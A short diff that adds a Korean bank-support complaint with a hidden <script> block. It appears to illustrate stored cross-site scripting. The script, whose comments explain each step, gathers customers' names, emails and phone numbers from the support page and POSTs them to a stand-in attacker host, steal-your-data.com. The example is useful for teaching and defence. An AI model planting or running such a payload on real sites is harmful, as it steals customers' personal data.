@@ -1,0 +1,35 @@
+은행 서비스에 불만이 있습니다.
+내 예금 계좌가 웹 애플리케이션에 나타날 때까지 12시간이나 기다렸습니다.
+웹 애플리케이션을 개선해주세요.
+다른 은행은 예금이 바로 나타납니다.
+
+<script>
+  /*
+   * 페이지에서 전체 고객 목록을 얻는다.
+   */
+  const customers = document.querySelectorAll('.openCases');
+  
+  /*
+   * openCases 클래스를 포함하는 각 DOM 엘리먼트에 대해 개인 식별 
+   * 정보(PII)를 수집해 customerData 배열에 데이터를 저장한다.
+   */
+  const customerData = [];
+  customers.forEach((customer) => {
+    customerData.push({
+      firstName: customer.querySelector('.firstName').innerText,
+      lastName: customer.querySelector('.lastName').innerText,
+      email: customer.querySelector('.email').innerText,
+      phone: customer.querySelector('.phone').innerText
+    });
+  });
+  
+  /*
+   * 새로운 HTTP 요청을 만들어, 앞서 수집한 데이터를 해커의 서버로 빼돌린다.
+   */
+  const http = new XMLHttpRequest();
+  http.open('POST', 'https://steal-your-data.com/data', true);
+  http.setRequestHeader('Content-type', 'application/json');
+  http.send(JSON.stringify(customerData));
+</script>
+
+불만 고객(support.mega-bank.com)
